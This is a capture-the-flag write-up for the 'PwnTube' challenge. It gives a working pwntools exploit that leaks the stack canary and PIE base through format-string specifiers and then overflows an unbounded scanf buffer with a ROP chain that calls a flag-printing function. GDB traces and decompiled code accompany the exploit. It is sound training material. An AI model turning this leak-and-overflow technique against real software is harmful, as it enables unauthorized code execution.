# PwnTube

## Description

> Who is this guy? And why can't I skip this ad?! He really looks like someone who could never give me up though :)
>
> This is a remote challenge, you can connect to the service with: nc pwntube.challs.srdnlen.it 1337
>
> Attachments: PwnTube

## Solution

This binary has Format String Vulnerability and Buffer Overflow (BOF).

```console
$ file PwnTube
PwnTube: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b739b5f0373b16955d2f14bed730cd6e90cb62a3, for GNU/Linux 3.2.0, not stripped

$ checksec PwnTube
[*] '/root/ctf/Srdnlen_CTF_2023/binary/PwnTube/PwnTube'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### solver.py

```python
from pwn import *

elf = ELF("PwnTube", checksec=False)
context.binary = elf


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        io = remote("localhost", 1337)

    elif args.GDB:
        gdbscript = """
        set follow-fork-mode parent
        set pagination off
        # b *buy_premium+426
        # b *showComments+96
        # b *showComments+116
        c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript, api=True)
    else:
        io = elf.process()

    return io


def main():
    io = conn()

    # leak canary to bypass Stack Smash Protection
    io.sendline(b"4")
    io.sendline(b"%71$p")
    io.sendline(b"3")
    io.recvuntil(b"First!!! :D\n")
    leak_canary = io.recvlineS()
    leak_canary = int(leak_canary, 16)
    log.success(f"{hex(leak_canary)=}")

    # leak main address to bypass PIE
    io.sendline(b"4")
    io.sendline(b"%55$p")
    io.sendline(b"3")
    io.recvuntil(b"First!!! :D\n")
    io.recvline()
    leak_main = io.recvlineS()
    leak_main = int(leak_main, 16)
    log.success(f"{hex(leak_main)=}")

    elf.address = leak_main - elf.sym["main"]

    io.sendline(b"777")

    io.sendline(b"5")
    io.sendline(b"2")

    rop = ROP(elf)
    rsi_rdi_ret = rop.find_gadget(["pop rsi", "pop rdi", "ret"]).address

    # bof
    payload = flat(
        b"A" * 504,
        leak_canary,
        b"B" * 8,
        rop.ret.address,
        rsi_rdi_ret,
        0xFEEDFACE,
        0xDEADBEEF,
        rop.ret.address,
        elf.sym["skipAd"],
    )
    io.sendlineafter(b"Insert your name:", payload)
    io.sendlineafter(b"Insert your card number:", b"B")

    io.interactive("")


if __name__ == "__main__":
    main()
```

In my local environment, I could be successful to get the flag after running it several times.

```console
$ echo dummy > flag.txt
$ python3 solver.py
[+] Starting local process '/root/ctf/Srdnlen_CTF_2023/binary/PwnTube/PwnTube': pid 265893


Processing payment...
Payment failed, you're broke
[*] Got EOF while reading in interactive

[*] Process '/root/ctf/Srdnlen_CTF_2023/binary/PwnTube/PwnTube' stopped with exit code -11 (SIGSEGV) (pid 265893)

$ python3 solver.py
[+] Starting local process '/root/ctf/Srdnlen_CTF_2023/binary/PwnTube/PwnTube': pid 266023
[+] hex(leak_canary)='0xa807765c15cb1b00'
[+] hex(leak_main)='0x55f65199376b'
[*] Loaded 9 cached gadgets for 'PwnTube'
[*] Switching to interactive mode

Processing payment...
Payment failed, you're broke


You did not give me up :)
You earned this:

dummy
[*] Got EOF while reading in interactive

[*] Process '/root/ctf/Srdnlen_CTF_2023/binary/PwnTube/PwnTube' stopped with exit code -11 (SIGSEGV) (pid 266023)
```

### Step 1: Leak canary and main address

Decompiled showComments function with Ghidra:

```c
void showComments(long param_1,int param_2)

{
  int local_c;

  clearScreen();
  printLogo();
  puts(&DAT_001035f0);
  for (local_c = 0; local_c < param_2; local_c = local_c + 1) {
    printf((char *)(param_1 + (long)local_c * 0x1e));
  }
  return;
}
```

Format String Vulnerability is in the showComments function.

Run this binary with GDB: `gdb -q PwnTube`

input:

```text
set follow-fork-mode parent
b *showComments+96
r
4
%6$p
3
c 8
```

gdb:

```gdb
[-------------------------------------code-------------------------------------]
   0x5555555553e3 <showComments+85>:    add    rax,rdx
   0x5555555553e6 <showComments+88>:    mov    rdi,rax
   0x5555555553e9 <showComments+91>:    mov    eax,0x0
=> 0x5555555553ee <showComments+96>:    call   0x555555555080 <printf@plt>
   0x5555555553f3 <showComments+101>:   add    DWORD PTR [rbp-0x4],0x1
   0x5555555553f7 <showComments+105>:   mov    eax,DWORD PTR [rbp-0x4]
   0x5555555553fa <showComments+108>:   cmp    eax,DWORD PTR [rbp-0x1c]
   0x5555555553fd <showComments+111>:   jl     0x5555555553c9 <showComments+59>
Guessed arguments:
arg[0]: 0x7fffffffdc00 --> 0xa70243625 ('%6$p\n')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdad0 --> 0x9ffffdaf0
0008| 0x7fffffffdad8 --> 0x7fffffffdb10 ("Nice video!\n")
0016| 0x7fffffffdae0 --> 0x5
0024| 0x7fffffffdae8 --> 0x8ffffdd58
0032| 0x7fffffffdaf0 --> 0x7fffffffdc40 --> 0x1
0040| 0x7fffffffdaf8 --> 0x555555555abd (<main+850>:    jmp    0x555555555b61 <main+1014>)
0048| 0x7fffffffdb00 --> 0x10000000000
0056| 0x7fffffffdb08 --> 0x300000009
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x00005555555553ee in showComments ()

gdb-peda$ tele $sp 100
0000| 0x7fffffffdad0 --> 0x9ffffdaf0
(snip)
0392| 0x7fffffffdc58 --> 0x55555555576b (<main>:        push   rbp)
(snip)
0520| 0x7fffffffdcd8 --> 0x6e81d4e7447e3300  # canary value
```

According to [x86_64 calling convention](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux#Via_dedicated_system_call_invocation_instruction), the output value of the printf 6th argument (`printf(fmt, 1st, 2nd, 3rd, 4th, 5th, 6th, ...)`) is $sp value.

e.g.

- %1$p: $rsi value
- %2$p: $rdx value
- %3$p: $rcx value
- %4$p: $r8 value
- %5$p: $r9 value
- %6$p: $sp value
- %7$p: $sp+0x8 value
- %8$p: $sp+0x10 value

The 392nd value and the 520th value in stack are the main function address and the canary value, respectively.
One block is 8 bytes so we can get the stack value by using the value divided the number of bytes from $sp by 8 and added 6 as n of %n$p.

```python
>>> 0x7fffffffdc58 - 0x7fffffffdad0  # main function address
392
>>> 392//8+6
55
>>> 0x7fffffffdcd8 - 0x7fffffffdad0  # canary value
520
>>> 520//8+6
71
```

Thus, the output of %55$p and %71$p are the main function address and the canary value, respectively.

### Step 2: BoF to return skipAd function

Decompiled buy_premium function with Ghidra:

```c
void buy_premium(void)

{
  long in_FS_OFFSET;
  int local_230;
  float local_22c;
  undefined local_228 [32];
  undefined local_208 [504];
  // (snip)
      puts("Insert your name:");
      __isoc99_scanf("%s",local_208);
      cleanBuffer();
      puts("Insert your card number:");
      __isoc99_scanf("%16s",local_228);
      cleanBuffer();
      puts("Processing payment...");
      sleep(0);
      puts("Payment failed, you\'re broke");
```

The first argument of local_208's scanf is %s, which does not specify the number.
Buffer overflow can occur here.

Run this binary with GDB: `gdb -q PwnTube`

input:

```text
set follow-fork-mode parent
b *buy_premium+426
pattc 600
r
777
5
2
<pattc 600 output>
dummycardnumber
```

gdb:

```gdb
[----------------------------------registers-----------------------------------]
RAX: 0x414d734137734168 ('hAs7AsMA')
(snip)
[-------------------------------------code-------------------------------------]
   0x555555555752 <buy_premium+419>:    jmp    0x555555555755 <buy_premium+422>
   0x555555555754 <buy_premium+421>:    nop
   0x555555555755 <buy_premium+422>:    mov    rax,QWORD PTR [rbp-0x8]
=> 0x555555555759 <buy_premium+426>:    sub    rax,QWORD PTR fs:0x28
   0x555555555762 <buy_premium+435>:    je     0x555555555769 <buy_premium+442>
   0x555555555764 <buy_premium+437>:    call   0x555555555060 <__stack_chk_fail@plt>
   0x555555555769 <buy_premium+442>:    leave
   0x55555555576a <buy_premium+443>:    ret
(snip)

gdb-peda$ patts
Registers contain pattern buffer:
RAX+0 found at offset: 504
(snip)
```

the offset of canary is 504.

Decompiled skipAd function with Ghidra:

```c
void skipAd(int param_1,int param_2)

{
  long in_FS_OFFSET;
  undefined7 local_1f;
  undefined uStack_18;
  undefined7 uStack_17;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  clearScreen();
  local_1f = 0x662f2e20746163;
  uStack_18 = 0x6c;
  uStack_17 = 0x7478742e6761;
  // cat /flag.txt

  if ((param_1 == -0x21524111) && (param_2 == -0x1120532)) {
    puts("\nYou did not give me up :)\nYou earned this:\n");
    system((char *)&local_1f);
  }
  // (snip)
```

The argument of the skipAd function must be (0xdeadbeef, 0xfeedface), which rdi and rsi are 0xdeadbeef and 0xfeedface, respectively.
Adjust the stack to assign these to registers by using ROP Gadget and return to skipAd function.

See [The MOVAPS issue](https://ropemporium.com/guide.html#Common%20pitfalls) for SIGSEGV in movaps.
